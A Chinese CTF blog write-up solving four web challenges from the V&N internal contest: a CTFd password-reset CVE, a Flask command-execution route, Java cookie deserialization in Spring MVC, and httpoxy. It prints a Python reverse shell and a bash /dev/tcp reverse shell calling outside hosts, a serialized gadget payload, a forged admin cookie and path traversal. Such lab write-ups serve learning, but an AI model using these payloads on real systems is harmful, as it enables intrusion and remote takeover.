---
title: v&n内部赛
date: 2020-02-29 00:06:11
updated: 2020-03-12 05:06:11
tags:
 - ctf
 - web
categories:
 - 刷题记录
---

## HappyCTFd

打开发现是一个CTFD的平台，搜索一下发现存在漏洞CVE-2020-7245，修改admin的密码

发现有一个题目名字叫做flagflag你在哪

<!--more-->

在file处有一个miaoflag文件打开就是flag

![](/pic/125.png)







## CheckIN

打开题目就是源码

```python
from flask import Flask, request
import os
app = Flask(__name__)

flag_file = open("flag.txt", "r")
# flag = flag_file.read()
# flag_file.close()
#
# @app.route('/flag')
# def flag():
#     return flag
## want flag? naive!

# You will never find the thing you want:) I think
@app.route('/shell')
def shell():
    os.system("rm -f flag.txt")
    exec_cmd = request.args.get('c')
    os.system(exec_cmd)
    return "1"

@app.route('/')
def source():
    return open("app.py","r").read()

if __name__ == "__main__":
    app.run(host='0.0.0.0')
```

发现flag_file已经打开了flag.txt

可以执行系统命令，发现用bash弹shell用不了

使用DNS/OOB记录所有文件

DNS/OOB[参考文章](https://www.freebuf.com/articles/database/183997.html)

手残了一下把（ls -R/）所有进行了dns解析

使用VPSnc监听12345端口

```bash
nc -lvvp 12345
```

payload

```
?c=python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("ns.seye.gq",12345));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'
```

进去之后发现没有grep功能，

```bash
ls -alR /
```



列出所有文件搜索flag

![](/pic/126.png)





## EasySpringMVC

提供了源码，下载下来进行代码审计

ClientInfo类用来存定义用户数据

```java
public class ClientInfo implements Serializable {
    private static final long serialVersionUID = 1L;
    private String name;
    private String group;
    private String id;

    public ClientInfo(String name, String group, String id) {
        this.name = name;
        this.group = group;
        this.id = id;
    }

    public String getName() {
        return this.name;
    }

    public String getGroup() {
        return this.group;
    }

    public String getId() {
        return this.id;
    }
```

Tools类用来处理序列化  [java序列化](https://www.runoob.com/java/java-serialization.html)   [ProcessBuilder可导致命令执行](https://www.jianshu.com/p/10f4771909f9)

Java的反序列化和PHP反序列化类似，php在反序列化的时候会调用对应类的__wakeup()函数，而java会调用该类readObject()函数。 

```java
//
// Source code recreated from a .class file by IntelliJ IDEA
// (powered by Fernflower decompiler)
//

package com.tools;

import java.io.ByteArrayInputStream;
import java.io.ByteArrayOutputStream;
import java.io.IOException;
import java.io.ObjectInputStream;
import java.io.ObjectOutputStream;
import java.io.Serializable;

public class Tools implements Serializable {
    private static final long serialVersionUID = 1L;
    private String testCall;

    public Tools() {
    }

    public static Object parse(byte[] bytes) throws Exception {
        ObjectInputStream ois = new ObjectInputStream(new ByteArrayInputStream(bytes));
        return ois.readObject();   //逆序列化
    }

    public static byte[] create(Object obj) throws Exception {
        ByteArrayOutputStream bos = new ByteArrayOutputStream();
        ObjectOutputStream outputStream = new ObjectOutputStream(bos);
        outputStream.writeObject(obj);
        return bos.toByteArray();   //序列化
    }

    private void readObject(ObjectInputStream in) throws IOException, ClassNotFoundException {
        Object obj = in.readObject();
        (new ProcessBuilder((String[])((String[])obj))).start();   //命令执行
    }
}

```

ClientInfoFilter类用来处理Cookies

```java
//
// Source code recreated from a .class file by IntelliJ IDEA
// (powered by Fernflower decompiler)
//

package com.filters;

import com.tools.ClientInfo;
import com.tools.Tools;
import java.io.IOException;
import java.util.Base64;
import java.util.Base64.Decoder;
import java.util.Base64.Encoder;
import javax.servlet.Filter;
import javax.servlet.FilterChain;
import javax.servlet.FilterConfig;
import javax.servlet.ServletException;
import javax.servlet.ServletRequest;
import javax.servlet.ServletResponse;
import javax.servlet.http.Cookie;
import javax.servlet.http.HttpServletRequest;
import javax.servlet.http.HttpServletResponse;

public class ClentInfoFilter implements Filter {
    public ClentInfoFilter() {
    }

    public void init(FilterConfig fcg) {
    }

    public void doFilter(ServletRequest request, ServletResponse response, FilterChain chain) throws IOException, ServletException {
        Cookie[] cookies = ((HttpServletRequest)request).getCookies();
        boolean exist = false;
        Cookie cookie = null;
        if (cookies != null) {        
            Cookie[] var7 = cookies;
            int var8 = cookies.length;

            for(int var9 = 0; var9 < var8; ++var9) {
                Cookie c = var7[var9];
                if (c.getName().equals("cinfo")) {
                    exist = true;
                    cookie = c; //如果cookies非空，cookie=cookies中“cinfo”中的值
                    break;
                }
            }
        }

        byte[] bytes;
        if (exist) {    //如果cookies中存在“cinfo”
            String b64 = cookie.getValue();
            Decoder decoder = Base64.getDecoder();
            bytes = decoder.decode(b64);  //cookies中“cinfo”base64解码后的值
            ClientInfo cinfo = null;
            if (!b64.equals("") && bytes != null) {
                try {
                    cinfo = (ClientInfo)Tools.parse(bytes);  //序列化
                } catch (Exception var14) {
                    var14.printStackTrace();
                }
            } else {   
                cinfo = new ClientInfo("Anonymous", "normal", ((HttpServletRequest)request).getRequestedSessionId());
                Encoder encoder = Base64.getEncoder();

                try {
                    bytes = Tools.create(cinfo);
                } catch (Exception var15) {
                    var15.printStackTrace();
                }

                cookie.setValue(encoder.encodeToString(bytes));
            }

            ((HttpServletRequest)request).getSession().setAttribute("cinfo", cinfo);
        } else {
            Encoder encoder = Base64.getEncoder();

            try {   //设置返回cookies
                ClientInfo cinfo = new ClientInfo("Anonymous", "normal", ((HttpServletRequest)request).getRequestedSessionId());
                bytes = Tools.create(cinfo);
                cookie = new Cookie("cinfo", encoder.encodeToString(bytes));
                cookie.setMaxAge(86400);
                ((HttpServletResponse)response).addCookie(cookie);
                ((HttpServletRequest)request).getSession().setAttribute("cinfo", cinfo);
            } catch (Exception var13) {
                var13.printStackTrace();
            }
        }

        chain.doFilter(request, response);
    }

    public void destroy() {
    }
}

```

PictureController类中有两条路由

> showpic.form中用户 为admin可以任意文件读取

```java
@RequestMapping({"/showpic.form"})
    public String index(HttpServletRequest httpServletRequest, HttpServletResponse httpServletResponse, String file) throws Exception {//获取get类型参数名为file
        if (file == null) {
            file = "showpic.jsp";
        }

        String[] attribute = file.split("\\.");
        String suffix = attribute[attribute.length - 1];
        if (!suffix.equals("jsp")) {
            boolean isadmin = ((ClientInfo)httpServletRequest.getSession().getAttribute("cinfo")).getName().equals("admin");
            if (isadmin || suffix.equals("jpg") && suffix.equals("gif")) {  
                this.show(httpServletRequest, httpServletResponse, file);
                return "showpic";
            } else {
                return "onlypic";
            }
        } else {
            StringBuilder stringBuilder = new StringBuilder();

            int unixSep;
            for(unixSep = 0; unixSep < attribute.length - 1; ++unixSep) {
                stringBuilder.append(attribute[unixSep]);
            }

            String jspFile = stringBuilder.toString();
            unixSep = jspFile.lastIndexOf(47);
            int winSep = jspFile.lastIndexOf(92);
            int pos = winSep > unixSep ? winSep : unixSep;
            jspFile = pos != -1 ? jspFile.substring(pos + 1) : jspFile;
            if (jspFile.equals("")) {
                jspFile = "showpic";
            }

            return jspFile;
        }
    }
private void show(HttpServletRequest httpServletRequest, HttpServletResponse httpServletResponse, String filename) throws Exception {   
        httpServletResponse.setContentType("image/jpeg");
        InputStream in = httpServletRequest.getServletContext().getResourceAsStream("/WEB-INF/resource/" + filename);
        if (in == null) {
            in = new FileInputStream(filename);
        }

        OutputStream os = httpServletResponse.getOutputStream();
        byte[] b = new byte[1024];

        while(((InputStream)in).read(b) != -1) {
            os.write(b);
        }

        ((InputStream)in).close();
        os.flush();
        os.close();
    }
```

> uploadpic.form中ClientInfo组要为webmanager用户 为admin可以文件上传

```java
@RequestMapping({"/uploadpic.form"})
    public String upload(MultipartFile file, HttpServletRequest request, HttpServletResponse response) throws Exception {
        ClientInfo cinfo = (ClientInfo)request.getSession().getAttribute("cinfo");
        if (!cinfo.getGroup().equals("webmanager")) {
            return "notaccess";
        } else if (file == null) {
            return "uploadpic";
        } else {
            String originalFilename = ((DiskFileItem)((CommonsMultipartFile)file).getFileItem()).getName();
            String realPath = request.getSession().getServletContext().getRealPath("/WEB-INF/resource/");
            String path = realPath + originalFilename;
            file.transferTo(new File(path));
            request.getSession().setAttribute("newpicfile", path);
            return "uploadpic";
        }
    }
```



先伪造一个组为webmanager，用户为admin的cookie

将CilentInfo类和Tools类原封不动的的复制到一个新项目中，再创建一个Test类

```java
import com.tools.ClientInfo;
import com.tools.Tools;

import java.util.Base64;

public class test {
    public static void main(String[] args)throws Exception{
        Base64.Encoder encoder = Base64.getEncoder();
        ClientInfo cinfo = new ClientInfo("admin","webmanager","1");
        byte[] bytes=Tools.create(cinfo);
        System.out.println(encoder.encodeToString(bytes));    //rO0ABXNyABRjb20udG9vbHMuQ2xpZW50SW5mbwAAAAAAAAABAgADTAAFZ3JvdXB0ABJMamF2YS9sYW5nL1N0cmluZztMAAJpZHEAfgABTAAEbmFtZXEAfgABeHB0AAp3ZWJtYW5hZ2VydAABMXQABWFkbWlu
    }
}
```

访问题目链接替换cookies

由have try,Anonymous变成了have try,admin

![](/[pic/139.png)

查看任意文件读取漏洞

![](/[pic/140.png)

成功读取到/etc下的passwd（）

读取flag失败，权限不足

```
Type 异常报告

消息 file=/../../flag (No such file or directory)

描述 服务器遇到一个意外的情况，阻止它完成请求。
```

尝试上传木马，权限不足

![](/[pic/141.png)

目录穿越后还是权限不足

![](/[pic/142.png)

尝试反序列化后命令执行

改写tools类，将private String testCall;改成下面的代码

```java
 private String[] testCall;

    public String[] getTestCall(){
        return testCall;
    }

    public void setTestCall(String[] testCall){
        this.testCall = testCall;
    }

```



Test类中

```
import com.tools.Tools;
import java.util.Base64;

public class test {
    public static void main(String[] args)throws Exception{
        Base64.Encoder encoder = Base64.getEncoder();
        Tools tools = new Tools();
        String cmds[]={"bash","-c","bash -i>& /dev/tcp/174.1.164.174/1234 0>&1"};
        tools.setTestCall(cmds);
        byte[] bytes=Tools.create(tools);
        System.out.println(encoder.encodeToString(bytes)); //rO0ABXNyAA9jb20udG9vbHMuVG9vbHMAAAAAAAAAAQIAAVsACHRlc3RDYWxsdAATW0xqYXZhL2xhbmcvU3RyaW5nO3hwdXIAE1tMamF2YS5sYW5nLlN0cmluZzut0lbn6R17RwIAAHhwAAAAA3QABGJhc2h0AAItY3QAKmJhc2ggLWk+JiAvZGV2L3RjcC8xNzQuMS4xNjQuMTc0LzEyMzQgMD4mMQ==

    }
}
```

然后用一台服务器监听即可收到shell

![](/[pic/143.png)









## TimeTravel

打开就是源码

```php
<?php
error_reporting(0);
require __DIR__ . '/vendor/autoload.php';

use GuzzleHttp\Client;

highlight_file(__FILE__);

if(isset($_GET['flag'])) {
    $client = new Client();
    $response = $client->get('http://127.0.0.1:5000/api/eligible');
    $content = $response->getBody();
    $data = json_decode($content, TRUE);
    if($data['success'] === true) {   //true返回值是数组,否则返回值为object
      echo system('/readflag');
    }
}

if(isset($_GET['file'])) {
    highlight_file($_GET['file']);
}

if(isset($_GET['phpinfo'])) {
    phpinfo();
}
```

查看phpinfo

是5.6.23版本的

发现没有禁用函数

| allow_url_fopen   | On   |
| ----------------- | ---- |
| allow_url_include | Off  |

存在任意文件读取

```php
//autoload.php
require_once __DIR__ . '/composer/autoload_real.php';

return ComposerAutoloaderInit52ffee59545490028d211df73b41c57d::getLoader();
```

```php
//autoload_real.php

```

```php
//./vendor/composer/ClassLoader.php
```

~~看到guzzlehttp/guzzle有任意写文件漏洞https://www.anquanke.com/post/id/86452~~

查看composer.json

```php
//composer.json
{
   "require": {
      "guzzlehttp/guzzle": "6.2.0"
   }
}
```



出题人[赵师傅博客](https://www.zhaoj.in/read-6407.html)也说了是改自https://github.com/vulhub/vulhub/tree/master/cgi/httpoxy



考点是cgi 的httpproxy漏洞（CVE-2016-5385） vulhub上有漏洞说明

> CGI的英文是（COMMON GATEWAY INTERFACE）公共网关接口，它的作用就是帮助服务器与语言通信，这里就是nginx和php进行通信，因为nginx和php的语言不通，因此需要一个沟通转换的过程，而CGI就是这个沟通的协议。
>
> nginx服务器在接受到浏览器传递过来的数据后，如果请求的是静态的页面或者图片等无需动态处理的则会直接根据请求的url找到其位置然后返回给浏览器，这里无需php参与，但是如果是一个动态的页面请求，这个时候nginx就必须与php通信，这个时候就会需要用到cgi协议，将请求数据转换成php能理解的信息，然后php根据这些信息返回的信息也要通过cgi协议转换成nginx可以理解的信息，最后nginx接到这些信息再返回给浏览器。
>
> 
>
>



访问请求时，添加一个proxy头部，浏览就会转发到 代理服务器，此时的访问就变成了代理服务器的127.0.0.1:500

```php
$response = $client->get('http://127.0.0.1:5000/api/eligible');
```

在代理服务器中弄一个web服务器，api/eligible的内容为

```
{"success":True}
```

即可得到。

**注意**

由于在buuoj上无法访问外网，但是可以获取一台内网linux的控制权，搭建一台代理服务器，也有更简单的方式，

创建一个文件内容为例如 a.txt

```http
HTTP/1.1 200 OK

{"success":true}
```

在linux上使用命令

```bash
nc -lvp 1234 < a.txt
```

然后发访问http://xxx/?flag，抓包添加一个proxy头部 地址为你获取控制权的linux ip地址

```http
GET /?flag HTTP/1.1
Host: node3.buuoj.cn:25315
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:72.0) Gecko/20100101 Firefox/72.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
Accept-Encoding: gzip, deflate
Connection: close
Upgrade-Insecure-Requests: 1
Cache-Control: max-age=0, no-cache
Proxy: http://174.0.246.216:1234/
Pragma: no-cache
```

即可获取flag

```html
 
 ········
 
#DD0000">'phpinfo'</span><span style="color: #007700">]))&nbsp;{<br />&nbsp;&nbsp;&nbsp;&nbsp;</span><span style="color: #0000BB">phpinfo</span><span style="color: #007700">();<br />}<br /></span>
</span>
</code>flag{7d7b2c9e-088c-4733-b70a-8ff3351479a7}
flag{7d7b2c9e-088c-4733-b70a-8ff3351479a7}
```







### 参考链接

https://www.cnblogs.com/ludashi/p/6513478.html
https://www.runoob.com/java/java-serialization.html
https://www.jianshu.com/p/10f4771909f9
https://mp.weixin.qq.com/s/KFgBbi2LgKhOKMDjfybl2A
https://www.colabug.com/2020/0204/6940556/amp/
https://github.com/vulhub/vulhub/tree/master/cgi/httpoxy
https://www.zhaoj.in/read-6407.html
https://blog.csdn.net/Leon_cx/article/details/81517603